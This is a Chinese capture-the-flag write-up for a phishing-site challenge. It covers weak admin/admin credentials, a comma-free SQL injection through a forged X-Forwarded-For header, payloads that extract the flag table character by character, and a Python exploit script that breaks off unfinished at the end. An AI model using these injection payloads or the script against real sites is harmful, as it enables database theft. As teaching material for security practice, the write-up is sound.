这里输入的用户名、密码都会记录到本题的数据库中，然后页面再跳转到真正的QQ空间页面（真实的界面是很华丽的）。

钓鱼网站是指欺骗用户的虚假网站。“钓鱼网站”的页面与真实网站界面基本一致，欺骗消费者或者窃取访问者提交的账号和密码信息。

除了提高安全意识外，我们做一下信息收集，发现/admin后台，并且以弱口令admin/admin可登录进去。

后台也是朴实无华，点击“QQ管理”

发现我们之前登录的用户名、密码都直接可以看到。（可恶(╬▔皿▔)凸，还好我输入的都是假的）

做到这里，基本不用考虑使用xss钓鱼之类，毕竟都进入到后台了。（最主要是这题没有写机器人用于模拟管理员进行登录）。本题也提示了“flag在数据库flag表的flag列”。

以下叙述本题的原思路：

用户账号、密码都被daddslashes函数给处理过，登录地址、登录时间、登录设备都不可控制，剩下的唯一一处就是登录IP。

通过设置X-Forwarded-For头，来尝试IP的伪造。

发现可以顺利伪造。话外音，这里之所以可以伪造，也是因为出题时候把一个函数给去掉。（也仅仅是去掉这个函数。）

// if (!ip2long($ip)) {
//     $ip = '';
// }

再进一步测试，会发现注入语句中只要出现逗号，回显的内容就会有问题。究其原因，是得思索服务端代码是如何获取IP的。

就是XFF头可能有多个IP，以逗号来分隔，然后代码里只获取第一个IP

if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
    $list = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
    $ip = $list[0];
}

这样的操作就是直接让我们不能使用逗号。那不使用逗号，能否注入呢？答案当然是可以的。

例如

'|(select(sleep(3)))|'

使用时间盲注是可行的，但有可以显示IP的地方，直接二次注入即可。（而且本来有一个getCity函数很费时，为了方便选手做题，我直接给设置返回“地球”）

0'|ascii(mid((select group_concat(flag) from flag)from(1)for(1)))+'

这样可以在登录IP处看到102，也就是f。（这里语句不能使用#来注释的原因，是该语句得插入到2条sql语句中，一条是查询IP次数的，另一条是插入到用户表的，需要同时支持2条语句正常运行，所以只能构造前后都是引号，中间使用运算符的形式。）

本题二血@虚拟鸡选手也是这样去做题，只不过他编写脚本后发现flag值会丢失一两个字符。这是为什么呢？

我们回到QQ管理处，不使用XFF头，发现同一个IP只能被记录3次。

也就是同样的字符只能存进3次。

$ipcount=$DB->count("SELECT count(*) from fish_user where ip='$realip'");
$username=daddslashes($_POST['user']);
if($ipcount<3){
    ...

但难不了我们，之前的注入语句其实是在做异或和加法运算，我们可以在加法上面动点手脚。

# 第1位加1000
0'|ascii(mid((select group_concat(flag) from flag)from(1)for(1)))+1000'
# 第2位加2000
0'|ascii(mid((select group_concat(flag) from flag)from(2)for(1)))+2000'
# 以此类推，flag中相同字符得到的结果也就不同了

为何是加1000、2000的呢？因为ascii的最大值也就是255，你加上1000的倍数，最后mod 1000即可。

#!/usr/bin/env python2
# -*- coding:utf8 -*-
import requests
import re
import random
import time
__author__ = 'ChunQiuGame GAMELAB'

def login(ses, url):
    url = '{0}admin/login.php'.format(url)
    data = {
        'user':'admin',
        'pass':'admin',
        'login':'%E7%99%BB%E5%BD%95',
    }
    cont = ses.post(url,data=data).text
    if u'登录成功' not in cont:
        print(cont)
        exit(-1)
    pass


def payload(idx):
    # X-Forwarded-For: 0'|(select 233)+'
    s = "0'|ascii(mid((select group_concat(flag) from flag)from({0})for(1)))+'{1}".format(idx,idx*1000)
    return s


def sqli(ses, url, flag_len):
    url = '{0}2021.php'.format(url)
    seed="1234567890abcdef"
    for idx in range(1,flag_len+1):
        headers = {
            'X-Forwarded-For' : payload(idx),
        }
        random_user = ''.join(random.choice(seed) for i in range(16))
        data = {
            'user': random_user,
            'pass': 'GAMELAB',
            'submit': '',
        }
        ses.post(url, headers=headers, data=data, allow_redirects=False)
        # time.sleep(0.1)
    pass


def get_list(ses, url, flag_len):
    for page in range(1,flag_len/15+2):
        urlx = '{0}admin/list.php?page={1}'.format(url,page)
        cont = ses.get(urlx).content
        pattern = '<td>GAMELAB</td><td>(\d*)</td>'
        lst = re.findall(pattern, cont, re.S)
        # mod 1000
        flag = ''.join([chr(int(i)%1000) for i in lst])[::-1]
        print(flag)
    pass


def foo():

if __name__ == '__main__':
